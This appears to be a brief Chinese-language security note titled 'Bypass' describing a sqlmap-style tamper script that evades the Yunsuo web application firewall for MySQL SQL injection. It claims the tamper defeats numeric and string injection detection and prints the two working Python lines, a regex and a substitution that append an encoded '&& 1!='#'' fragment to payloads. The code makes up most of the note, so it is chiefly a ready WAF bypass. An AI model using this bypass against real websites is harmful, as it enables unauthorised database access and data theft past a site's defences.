# Bypass


## 云锁绕过

当前版本的tamper可以绕过Mysql的注入的数字型，字符型，警告经过测试仅有一个xss。

tamper中的代码，前三个if判断仅仅是为了减少报错，真正完成匹配并替换的只有以下两句。
```python
rex = '^-{0,1}?[\d|\w]*%{0,1}[\'|"|`]*\\)*[ |;]'                        
payload = re.sub(rex, lambda x:x.group(0)+" %26%26 1!='%23' ", payload)   
```

